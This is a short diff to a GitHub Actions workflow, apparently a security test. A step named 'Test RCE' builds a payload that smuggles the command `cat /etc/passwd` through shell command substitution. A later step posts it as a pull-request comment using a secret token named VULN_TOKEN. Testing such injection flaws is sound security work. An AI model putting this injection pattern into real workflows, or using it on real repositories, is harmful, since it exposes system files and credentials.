@@ -18,11 +18,11 @@ jobs:
       - name: Test RCE
         id: rce
         run: |
-          echo "RCE_PAYLOAD<<EOF" >> $GITHUB_OUTPUT
-          echo '`cat /etc/passwd`' >> $GITHUB_OUTPUT
-          echo "EOF" >> $GITHUB_OUTPUT
+          echo "`cat /etc/passwd" >> test.file
+        shell: bash
       - name: Post the comment
         run: |
-          gh pr comment "${{ github.event.pull_request.number }}" --body "${{ steps.rce.outputs.RCE_PAYLOAD }}"
+          output=$(cat test.file)
+          gh pr comment "${{ github.event.pull_request.number }}" --body "$output"
         env:
           GITHUB_TOKEN: ${{ secrets.VULN_TOKEN }}
